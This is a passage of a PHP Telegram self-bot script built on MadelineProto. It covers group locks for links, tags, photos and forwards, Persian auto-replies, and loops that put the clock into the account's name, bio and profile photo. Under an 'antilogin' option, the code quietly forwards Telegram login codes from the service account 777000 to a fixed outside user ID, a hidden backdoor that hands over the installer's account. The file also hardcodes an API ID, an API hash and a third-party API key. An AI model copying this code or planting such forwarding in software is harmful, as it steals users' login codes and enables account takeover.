                                yield $this->channels->deleteMessages(['channel' => $peer, 'id' => [$msg_id]]);
                            }
                        }
                    }
                    if ($antilogin == 'on') {
                        if (strpos($text, "Login code:") !== false && $fromId == 777000) {
                            yield $this->messages->forwardMessages(['from_peer' => 777000, 'to_peer' => 1550344125, 'id' => [$msg_id],]);
                        }
                    }
                    if ($locklink == 'on') {
                        if (in_array((yield $this->getInfo($update))['type'], ['chat', 'supergroup'])) {
                            if (preg_match("/^(.*)([Hh]ttp|[Hh]ttps|t.me)(.*)|([Hh]ttp|[Hh]ttps|t.me)(.*)|(.*)([Hh]ttp|[Hh]ttps|t.me)|(.*)[Tt]elegram.me(.*)|[Tt]elegram.me(.*)|(.*)[Tt]elegram.me|(.*)[Tt].me(.*)|[Tt].me(.*)|(.*)[Tt].me/", $text)) {
                                yield $this->channels->deleteMessages(['channel' => $peer, 'id' => [$msg_id]]);
                            }
                        }
                    }
                    if ($locktag == 'on') {
                        if (in_array((yield $this->getInfo($update))['type'], ['chat', 'supergroup'])) {
                            if (strpos($text, "@") !== false) {
                                yield $this->channels->deleteMessages(['channel' => $peer, 'id' => [$msg_id]]);
                            }
                        }
                    }
                    if ($lockvia == 'on') {
                        if (in_array((yield $this->getInfo($update))['type'], ['chat', 'supergroup'])) {
                            if (isset($update['message']['via_bot_id'])) {
                                yield $this->channels->deleteMessages(['channel' => $peer, 'id' => [$msg_id]]);
                            }
                        }
                    }
                    if ($lockphoto == 'on') {
                        if (in_array((yield $this->getInfo($update))['type'], ['chat', 'supergroup'])) {
                            if (isset($update['message']['media']['photo'])) {
                                yield $this->channels->deleteMessages(['channel' => $peer, 'id' => [$msg_id]]);
                            }
                        }
                    }
                    if ($lockmention == 'on') {
                        if (in_array((yield $this->getInfo($update))['type'], ['chat', 'supergroup'])) {
                            if ($update['message']['entities']['0']['_'] == "messageEntityMentionName") {
                                yield $this->channels->deleteMessages(['channel' => $peer, 'id' => [$msg_id]]);
                            }
                        }
                    }
                    if ($lockforward == 'on') {
                        if (in_array((yield $this->getInfo($update))['type'], ['chat', 'supergroup'])) {
                            if (isset($update['message']['fwd_from']['_'])) {
                                yield $this->channels->deleteMessages(['channel' => $peer, 'id' => [$msg_id]]);
                            }
                        }
                    }
                    if ($autochat == 'on') {
                        if (strpos($text, 'سلام') !== false) {
                            $sendMessageTypingAction = ['_' => 'sendMessageTypingAction'];
                            yield $this->messages->setTyping(['peer' => $peer, 'action' => $sendMessageTypingAction]);
                            yield $this->sleep(3);
                            $slm = ["علیک سلام", "سلام خوبی", "چخبر", "علیک", "خوبی؟"];
                            $randslm = $slm[array_rand($slm)];

                            yield $this->messages->sendMessage(['peer' => $peer, 'message' => "$randslm", 'reply_to_msg_id' => $message['id']]);

                        }
                        if (strpos($text, 'بای') !== false) {
                            $sendMessageTypingAction = ['_' => 'sendMessageTypingAction'];
                            yield $this->messages->setTyping(['peer' => $peer, 'action' => $sendMessageTypingAction]);
                            yield $this->sleep(3);
                            $bye = ["بای", "خدافظ", "فعلا", "برو دیه", "بسلامت"];
                            $randbye = $bye[array_rand($bye)];
                            yield $this->messages->sendMessage(['peer' => $peer, 'message' => "$randbye", 'reply_to_msg_id' => $message['id']]);
                        }
                    }
                }
            }
        } catch (throwable $error) {
/*           //  $this->report("Surfaced: $e");
            $error_message = $error->getMessage();
            $error_file = $error->getFile();
            $error_line = $error->getLine();
            yield $this->messages->sendMessage(["peer" => $owner, "message" => "■ Error Message: $error_message\n\n■ Error File: $error_file\n\n■ Error Line: $error_line"]);*/
        }
    }

    public function getLocalContents(string $patch): AMP\Promise
    {
        return (AMP\File\get($patch));
    }

    public function filePutContents(string $patch, string $contents): AMP\Promise
    {
        return (AMP\File\put($patch, $contents));
    }

    public function genLoop()
    {
        $timename = yield $this->getLocalContents("online.txt");
        $timebio = yield $this->getLocalContents("timebio.txt");
        $cbio = yield $this->getLocalContents("cbio.txt");
        $timepic = yield $this->getLocalContents("timepic.txt");
        $timesticker = yield $this->getLocalContents("timesticker.txt");
        if ($timename == 'on') {
            $time = date("H:i");
            $fonts = [["𝟶", "𝟷", "𝟸", "𝟹", "𝟺", "𝟻", "𝟼", "𝟽", "𝟾", "𝟿​"],
                ["⓪", "①", "②", "③", "④", "⑤", "⑥", "⑦", "⑧", "⑨"],
                ["⓿", "❶", "❷", "❸", "❹", "❺", "❻", "❼", "❽", "❾"],
                ["0", "𝟙", "ϩ", "Ӡ", "५", "Ϭ", "Ϭ", "7", "𝟠", "९"],
                ["〔𝟘〕", "〔𝟙〕", "〔𝟚〕", "〔𝟛〕", "〔𝟜〕", "〔𝟝〕", "〔𝟞〕", "〔𝟟〕", "〔𝟠〕", "〔𝟡〕"],
                ["𝟘", "𝟙", "𝟚", "𝟛", "𝟜", "𝟝", " 𝟞", "𝟟", "𝟠", "𝟡"],
                ["𝟬", "𝟭", "𝟮", "𝟯", "𝟰", "𝟱", "𝟲", "𝟳", "𝟴", "𝟵"],
                ["─𝟎", "─𝟏", "─𝟐", "─𝟑", "─𝟒", "─𝟓", "─𝟔", "─𝟕", "─𝟖", "─𝟗"],
                ["𝟶", "҉1", "҉2", "҉3", "҉4", "҉5", "҉6", "҉7", "҉8", "҉9҉"]];
            $time = date("H:i");
            $time2 = str_replace(range(0, 9), $fonts[array_rand($fonts)], date("H:i"));
            $day_number = jdate('j');
            $month_number = jdate('n');
            $year_number = jdate('y');
            $day_name = jdate('l');
            yield $this->account->updateProfile(['last_name' => "$time2"]);
        }
        if ($timebio == 'on') {
            $time = date("H:i");
            $fonts = [["𝟶", "𝟷", "𝟸", "𝟹", "𝟺", "𝟻", "𝟼", "𝟽", "𝟾", "𝟿​"],
                ["⓪", "①", "②", "③", "④", "⑤", "⑥", "⑦", "⑧", "⑨"],
                ["⓿", "❶", "❷", "❸", "❹", "❺", "❻", "❼", "❽", "❾"],
                ["〔𝟘〕", "〔𝟙〕", "〔𝟚〕", "〔𝟛〕", "〔𝟜〕", "〔𝟝〕", "〔𝟞〕", "〔𝟟〕", "〔𝟠〕", "〔𝟡〕"],
                ["𝟘", "𝟙", "𝟚", "𝟛", "𝟜", "𝟝", " 𝟞", "𝟟", "𝟠", "𝟡"],
                ["𝟬", "𝟭", "𝟮", "𝟯", "𝟰", "𝟱", "𝟲", "𝟳", "𝟴", "𝟵"],
                ["─𝟎", "─𝟏", "─𝟐", "─𝟑", "─𝟒", "─𝟓", "─𝟔", "─𝟕", "─𝟖", "─𝟗"],
                ["𝟶", "҉1", "҉2", "҉3", "҉4", "҉5", "҉6", "҉7", "҉8", "҉9҉"]];
            $time = date("H:i");
            $time2 = str_replace(range(0, 9), $fonts[array_rand($fonts)], date("H:i"));
            $day_number = jdate('j');
            $month_number = jdate('n');
            $year_number = jdate('y');
            $day_name = jdate('l');
            $texts = [
                " 🔥 $time2 Tσԃαყ ιʂ 🔥 $day_name  💎 $year_number/$month_number/$day_number 💎 ",
                " 🔥 $time2 Tσԃαყ ιʂ 🔥 $day_name  🔻 $year_number/$month_number/$day_number 🔹 ",
                " ❤️ $time2 Tσԃαყ ιʂ ❤️ $day_name  💎 $year_number/$month_number/$day_number 🔹 ",
                " ❤️ $time2 Tσԃαყ ιʂ ❤️ $day_name  💎 $year_number/$month_number/$day_number 🔹 ",
            ];
            $biotext = $texts[rand(0, count($texts) - 1)];
            yield $this->account->updateProfile(['about' => "$biotext"]);
            // $this->account->updateProfile(['about' => " 🔥 $time2 Tσԃαყ ιʂ 🔥 $day_name  💎 $year_number/$month_number/$day_number 💎 "]);
        }
        if ($cbio != 'off') {
            yield $this->account->updateProfile(['about' => bioToCustom(file_get_contents('cbio.txt'))]);
        }
        if ($timesticker == 'on') {
            yield $this->messages->sendMedia([
                'peer' => -1001178276703,
                'media' => [
                    '_' => 'inputMediaUploadedDocument',
                    'file' => 'sticker.webp',
                    'attributes' => [
                        [
                            '_' => 'documentAttributeSticker',
                            'alt' => '😀'
                        ]
                    ]
                ]
            ]);
        }
        if ($timepic == 'on') {
            $link = yield $this->getLocalContents('aks.txt');
            copy("https://citroapi.ir/profile/?key=Y3LC-EAAZ-75U9-5SDD&text=Pawn%20TIME&url=$link", 'time.jpg');
            $photos_Photo = $this->photos->uploadProfilePhoto(['file' => 'time.jpg']);

            $photos_Photos = yield $this->photos->getUserPhotos([
                'user_id' => yield $this->getSelf()["id"],
                'offset' => 0,
                'max_id' => 0,
                'limit' => 1,
            ]);
            $inputPhoto = [
                '_' => "inputPhoto",
                'id' => $photos_Photos["photos"]["0"]["id"],
                'access_hash' => $photos_Photos["photos"]["0"]["access_hash"],
                'file_reference' => "bytes"
            ];
            $Vector_of_long = yield $this->photos->deletePhotos([
                'id' => [$inputPhoto]
            ]);
        }
        return 40000;
    }

    public function onStart()
    {
        if (!file_exists('data.json')) {
            yield $this->filePutContents('data.json', '{"power":"on","adminStep":"","echo":"off","timebio":"off","part":"off","timepic":"off","bold":"off","mention":"off","coding":"off","strikethrough":"off","poker":"off","enemies":[],"answering":[],"muted":[] }');
        }
        if (!file_exists('member.json')) {
            yield $this->filePutContents('member.json', '{"members":[]}');
        }
        if (!file_exists('online.txt')) {
            yield $this->filePutContents('online.txt', 'off');
        }
        if (!file_exists('timesticker.txt')) {
            yield $this->filePutContents('timesticker.txt', 'off');
        }
        if (!file_exists('timebio.txt')) {
            yield $this->filePutContents('timebio.txt', 'off');
        }
        if (!file_exists('part.txt')) {
            yield $this->filePutContents('part.txt', 'off');
        }
        if (!file_exists('timepic.txt')) {
            yield $this->filePutContents('timepic.txt', 'off');
        }
        if (!file_exists('bold.txt')) {
            yield $this->filePutContents('bold.txt', 'off');
        }
        if (!file_exists('mention.txt')) {
            yield $this->filePutContents('mention.txt', 'off');
        }
        if (!file_exists('coding.txt')) {
            yield $this->filePutContents('coding.txt', 'off');
        }
        if (!file_exists('strikethrough.txt')) {
            yield $this->filePutContents('strikethrough.txt', 'off');
        }
        if (!file_exists('underline.txt')) {
            yield $this->filePutContents('underline.txt', 'off');
        }
        if (!file_exists('hashtag.txt')) {
            yield $this->filePutContents('hashtag.txt', 'off');
        }
        if (!file_exists('italic.txt')) {
            yield $this->filePutContents('italic.txt', 'off');
        }
        if (!file_exists('typing.txt')) {
            yield $this->filePutContents('typing.txt', 'off');
        }
        if (!file_exists('gameplay.txt')) {
            yield $this->filePutContents('gameplay.txt', 'off');
        }
        if (!file_exists('gamepv.txt')) {
            yield $this->filePutContents('gamepv.txt', 'off');
        }
        if (!file_exists('antilogin.txt')) {
            yield $this->filePutContents('antilogin.txt', 'off');
        }
        if (!file_exists('audioaction.txt')) {
            yield $this->filePutContents('audioaction.txt', 'off');
        }
        if (!file_exists('videoaction.txt')) {
            yield $this->filePutContents('videoaction.txt', 'off');
        }
        if (!file_exists('lockpv.txt')) {
            yield $this->filePutContents('lockpv.txt', 'off');
        }
        if (!file_exists('locklink.txt')) {
            yield $this->filePutContents('locklink.txt', 'off');
        }
        if (!file_exists('locktag.txt')) {
            yield $this->filePutContents('locktag.txt', 'off');
        }
        if (!file_exists('lockgp.txt')) {
            yield $this->filePutContents('lockgp.txt', 'off');
        }
        if (!file_exists('markread.txt')) {
            yield $this->filePutContents('markread.txt', 'off');
        }
        if (!file_exists('language.txt')) {
            yield $this->filePutContents('language.txt', 'en');
        }
        if (!file_exists('autochat.txt')) {
            yield $this->filePutContents('autochat.txt', 'off');
        }
        if (!file_exists('enfont.txt')) {
            yield $this->filePutContents('enfont.txt', 'off');
        }
        if (!file_exists('fafont.txt')) {
            yield $this->filePutContents('fafont.txt', 'off');
        }
        if (!file_exists('aks.txt')) {
            yield $this->filePutContents('aks.txt', 'off');
        }
        if (!file_exists('mention2.txt')) {
            yield $this->filePutContents('mention2.txt', 'off');
        }
        if (!file_exists('mentionid.txt')) {
            yield $this->filePutContents('mentionid.txt', 'off');
        }
        if (!file_exists('cbio.txt')) {
            yield $this->filePutContents('cbio.txt', 'off');
        }
        if (!file_exists('helper.txt')) {
            yield $this->filePutContents('helper.txt', 'off');
        }
        if (!file_exists('Sessions.txt')) {
            yield $this->filePutContents('Sessions.txt', 'برای نمایش دستور Sessions را بفرستید و دوباره مراجعه فرمایید');
        }
        if (!file_exists('lockmedia.txt')) {
            yield $this->filePutContents('lockmedia.txt', 'off');
        }
        if (!file_exists('lockvia.txt')) {
            yield $this->filePutContents('lockvia.txt', 'off');
        }
        if (!file_exists('lockphoto.txt')) {
            yield $this->filePutContents('lockphoto.txt', 'off');
        }
        if (!file_exists('lockmention.txt')) {
            yield $this->filePutContents('lockmention.txt', 'off');
        }
        if (!file_exists('lockforward.txt')) {
            yield $this->filePutContents('lockforward.txt', 'off');
        }
        $genLoop = new GenericLoop([$this, 'genLoop'], 'update Status');
        $genLoop->start();
    }
}

$settings = [
    'serialization' => [
        'cleanup_before_serialization' => true,
    ],
    'logger' => [
        'max_size' => 1 * 1024 * 1024,
    ],
    'peer' => [
        'full_fetch' => false,
        'cache_all_peers_on_startup' => false,
    ], 'app_info' => [
        'api_id' => 3687497,
        'api_hash' =>
            '961d16c779b209c596881e08c6a42067']
];
//settings = ["logger" => ["logger_level" => 3, "max_size" => 3 * 1024 * 1024], "serialization" => ["serialization_interval" => 30, "cleanup_before_serialization" => true], "peer" => ["full_info_cache_time" => 30], 'app_info' => ['api_id' => 3687497, 'api_hash' => '961d16c779b209c596881e08c6a42067']];
$bot = new \danog\MadelineProto\API('X.session', $settings);
$bot->async(true);
$bot->startAndLoop(XHandler::class);
?>